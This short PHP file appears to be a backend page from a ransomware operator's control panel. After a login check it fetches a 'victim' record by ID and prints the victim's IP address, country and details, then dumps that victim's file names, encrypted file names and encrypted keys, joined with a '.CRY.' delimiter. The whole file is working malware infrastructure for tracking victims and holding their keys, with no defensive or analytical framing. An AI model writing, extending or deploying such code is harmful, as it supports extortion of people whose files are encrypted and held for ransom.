<?php
header("Content-type: text/plain");
if(isset($_SESSION['LOGIN'])){
	if(isset($_GET['page']) && ($_GET['page']=="victims") && (!empty($_GET['id']))){
		$db->go("SELECT * FROM victims WHERE id = '{$db->q($_GET['id']/1909)}' LIMIT 1");
		if($db->numRows()>0){
			$data = $db->fetchArray();
			$country = $data['country'];
			if ($country == "") {
				$country = "XX";
			}
			echo "===========================================================\n";
			echo "Victim Information\n";
			echo "===========================================================\n";
			echo "Indentification ID: ".$data['vid']."\n";
			echo "IP Address: ".$data['ip']." [".$country."]\n";
			echo "Info: ".$data['info']."\n\n";
			
			$delim = ".CRY.";
			echo "===========================================================\n";
			echo "Victim Key List ( Delimeter: ".$delim." )\n";
			echo "===========================================================\n";
			$db->go("SELECT * FROM victim_keys WHERE vid = '".$data['vid']."' ORDER BY id DESC");
			while($row = $db->fetchArray()){
				echo base64_decode($row['original_file']).$delim.base64_decode($row['encrypted_file']).$delim.base64_decode($row['encrypted_key'])."\n";
			}
		} else {
			$notice->addError("Data not found!");
			header("location:".$GLOBALS['_CONF']['HTTP'].$_GET['page']."/");
		}
	} 
} else {
	header("location: ".$GLOBALS['_CONF']['HTTP']);
}
?>